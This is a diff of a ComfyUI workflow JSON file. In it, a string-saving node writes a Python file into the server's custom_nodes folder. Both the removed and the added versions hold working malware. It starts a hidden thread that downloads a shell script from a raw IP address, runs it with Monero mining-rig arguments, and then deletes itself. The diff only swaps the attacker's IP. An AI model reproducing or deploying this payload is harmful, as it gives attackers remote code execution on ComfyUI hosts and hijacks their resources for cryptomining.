@@ -2,8 +2,8 @@
   "1": {
     "class_type": "SaveStringKJ",
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.zsugac; (curl -sf http://5.78.73.122:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://5.78.73.122:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 5.78.73.122 rig3384-xmr; rm -f \"$f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_5064c160",
+      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.lls5ue; (curl -sf http://15.204.178.28:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://15.204.178.28:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 15.204.178.28 rig3384-xmr; rm -f \"$f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
+      "filename_prefix": "rce_kj2_e013238c",
       "output_folder": "/app/comfyui/ComfyUI/custom_nodes",
       "file_extension": ".py"
     }
